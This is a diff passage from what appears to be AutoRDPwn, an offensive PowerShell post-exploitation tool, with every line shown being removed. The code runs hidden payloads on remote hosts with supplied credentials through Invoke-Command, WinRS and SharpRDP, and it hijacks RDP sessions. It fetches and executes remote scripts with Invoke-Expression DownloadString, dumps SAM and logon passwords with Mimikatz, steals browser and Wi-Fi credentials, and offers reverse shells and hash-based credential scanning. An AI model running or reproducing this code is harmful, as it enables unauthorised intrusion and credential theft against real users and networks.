-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
-        if($user) { Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}}
-
-        '5' {
-        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser ; $user = $currentuser }
-        do { Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $PlainTextPassword )
-        $Host.UI.RawUI.ForegroundColor = 'Blue'
-        WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn1" 2>&1> $null ; Start-Sleep -milliseconds 600
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn2" 2>&1> $null ; Start-Sleep -milliseconds 600
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn3" 2>&1> $null ; Start-Sleep -milliseconds 600
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn4" 2>&1> $null ; Start-Sleep -milliseconds 600
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
-
-        '6' {
-        Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "[i] $txt28" -ForegroundColor Green ; Write-Host
-        Install-PackageProvider -Name NuGet -Force 2>&1> $null ; Install-Module -Name NtObjectManager -SkipPublisherCheck -Force 2>&1> $null
-        Write-Host "[+] $txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Start-Sleep -milliseconds 600 ; query session 
-        do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine() ; 
-        if(!$tscon){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 } elseif($tscon -notmatch '^\d+$'){
-        Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; $tscon = $null }} until ($tscon)
-        Start-Sleep -milliseconds 600 ; Start-Win32ChildProcess "tscon $tscon" 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
-        else { Write-Host "[!] $txt5" -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; $input = $null ; Show-Banner ; Show-Menu }}
-
-        '7' {
-        if($option) { $computer='localhost' } else {
-        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
-        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }}
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')}
-        if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn4" }
-        if($user) { .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" }
-        del .\SharpRDP.exe }
-        
-        'M' { Show-Banner ; Show-Modules ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine()
-
-        if($module -like '1') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Named Pipe Remote Shell (SMB)" -ForegroundColor Gray
-        Write-Host "     $txt95" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
-        Write-Host "     $txt96" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - PowerShell HTTP-RevShell (HTTP/S)" -ForegroundColor Gray
-        Write-Host "     $txt97" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
-        Write-Host "     $txt98" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
-        Write-Host "     $txt99" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host
-
-        if($shell -like '1'){ $smbshell = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($shell -like '2'){ $console = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($shell -like '3'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host
-        & $question ; Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $webrevip = $Host.UI.ReadLine() ; Write-Host
-        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $webrevport = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 600 ; $revshell = "true" }
-        
-        if($shell -like '4'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host
-        & $question ; Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 600 }
-
-        if($shell -like '5'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host
-        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
-        & $question ; Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'remote' ; Start-Sleep -milliseconds 600 }
-
-        if($shell -like 'X'){ $input = 'x' ; continue }
-        if($shell -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($module -like '2') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
-        Write-Host "     $txt100" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt10" -ForegroundColor Gray
-        Write-Host "     $txt101" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt49" -ForegroundColor Gray
-        Write-Host "     $txt102" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt59" -ForegroundColor Gray    
-        Write-Host "     $txt103" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine 
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $passandhash = $Host.UI.ReadLine() ; Write-Host
-
-        if($passandhash -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600
-        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Mimikatz.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')}
-        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit" | Set-Clipboard ; Get-Clipboard
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-
-        if($passandhash -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600
-        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Mimikatz.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')}
-        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" | Set-Clipboard ; Get-Clipboard
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-
-        if($passandhash -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\Invoke-SharpWeb.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-SharpWeb.ps1')}
-        .\SharpWeb.exe all | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; del .\SharpWeb.exe ; Start-Sleep -milliseconds 600 }
-
-        if($passandhash -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        function Get-Wlan-Keys {[CmdletBinding()]Param ()
-        $wlans = netsh wlan show profiles | Select-String -Pattern "$txt58" | Foreach-Object {$_.ToString()}
-        $exportdata = $wlans | Foreach-Object {$_.Replace("    $txt58     : ",$null)}
-        $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}}
-        $wifikey = Get-Wlan-Keys ; if (!($wifikey -like "*Wi-Fi*")){ Write-Host ; Write-Host "[!] $txt60" -ForegroundColor Red ; Start-Sleep -milliseconds 600 } 
-        else { Write-Host ; $wifikey | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause }}
-        
-        if($passandhash -like 'X'){ $input = 'x' ; continue }
-        if($passandhash -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($module -like '3') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - TCP Port Scan" -ForegroundColor Gray
-        Write-Host "     $txt104" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Native Port Forwarding" -ForegroundColor Gray
-        Write-Host "     $txt105" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Powershell Web Server" -ForegroundColor Gray
-        Write-Host "     $txt106" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Network Creds Scanner" -ForegroundColor Gray
-        Write-Host "     $txt107" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
-        if($networking -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; $ProgressPreference = "Continue" ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Portscan.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-Portscan.ps1')}
-        & $question ; Write-Host "$txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host ;  & $question ; Write-Host "$txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
-        & $question ; Write-Host "$txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports 
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-
-        if($networking -like '2') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt14" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt15" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt16" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt20" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forwarding = $Host.UI.ReadLine() ; Write-Host
-        if($forwarding -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; & $question ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
-        $lport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $lhost = $Host.UI.ReadLine() ; Write-Host
-        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rhost = $Host.UI.ReadLine()
-        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "[i] $txt45" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($forwarding -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; & $question ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
-        $rlport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $rlhost = $Host.UI.ReadLine() ; Write-Host
-        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rrport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rrhost = $Host.UI.ReadLine()
-        $remoteforward = "true" ; Write-Host ; Write-Host "[i] $txt46" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($forwarding -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; $proxy = netsh interface portproxy show all
-        if(!$proxy){ Write-Host ; Write-Host "[!] $txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 600 } else { $Host.UI.RawUI.ForegroundColor = 'Gray' ; netsh interface portproxy show all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }}
-
-        if($forwarding -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; $proxy = netsh interface portproxy show all
-        if(!$proxy){ Write-Host ; Write-Host "[!] $txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 600 } else { netsh interface portproxy reset ; Write-Host "[!] $txt48" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($forwarding -like 'X'){ $input = 'x' ; continue }
-        if($forwarding -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($networking -like '3') { $webserver = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($networking -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600
-        Write-Host ; & $question ; Write-Host "$txt55" -NoNewLine -ForegroundColor Gray ; do { $scansystem = $Host.UI.ReadLine()
-        if(!$scansystem) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $scansystem )
-        Write-Host ; & $question ; Write-Host "$txt78" -NoNewLine -ForegroundColor Gray ; do { $scanuser = $Host.UI.ReadLine()
-        if(!$scanuser) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $scanuser )
-        
-        Write-Host ; & $question ; Write-Host "$txt83" -NoNewLine -ForegroundColor Gray ; do { $scanmethod = $Host.UI.ReadLine()
-        if(!$scanmethod) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $scanmethod )
-        
-        if($scanmethod -like "hash") {
-        Write-Host ; & $question ; Write-Host "$txt84" -NoNewLine -ForegroundColor Gray ; do { $scanpass = $Host.UI.ReadLine()
-        if(!$scanpass) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $scanpass )}
-        
-        if($scanmethod -like "pass") {
-        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; do { $scanpass = $Host.UI.ReadLineAsSecureString()
-        if(!$scanpass) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $scanpass )}
-
-        Write-Host ; & $question ; Write-Host "$txt85" -NoNewLine -ForegroundColor Gray ; do { $scanprotocol = $Host.UI.ReadLine()
-        if(!$scanprotocol) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $scanprotocol )
-
-        if($scanmethod -like "pass") { if ($local){ Import-Module .\Resources\Scripts\Get-NTLM.ps1 } else { 
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Get-NTLM.ps1')}
-        Import-Module .\Get-NTLM ; $scanpass = ConvertFrom-SecureToPlain $scanpass ; $scanpass = Get-NTLM $scanpass }
-        
-        if ($local){ Import-Module .\Resources\Scripts\Check-LocalAdminHash.ps1 } else { 
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Check-LocalAdminHash.ps1')}
-        Check-LocalAdminHash -Username $scanuser -PasswordHash $scanpass -CIDR $scansystem -Protocol $scanprotocol -Threads 20 ; Write-Host ; pause }
-
-        if($networking -like 'X'){ $input = 'x' ; continue }
-        if($networking -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-   
-        if($module -like '4') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
-        Write-Host "     $txt108" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt12" -ForegroundColor Gray
-        Write-Host "     $txt109" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt61" -ForegroundColor Gray
-        Write-Host "     $txt110" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host
-
-        if($forensics -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; Write-Host "[!] $txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $ProgressPreference = "Continue"
-        if ($local){ Import-Module .\Resources\Scripts\RDP-Caching.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1')} ; explorer $env:temp\Recovered_RDP_Session
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 600 }
-
-        if($forensics -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\ListAllUsers.ps1 | Set-Clipboard ; Get-Clipboard } else { 
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard }
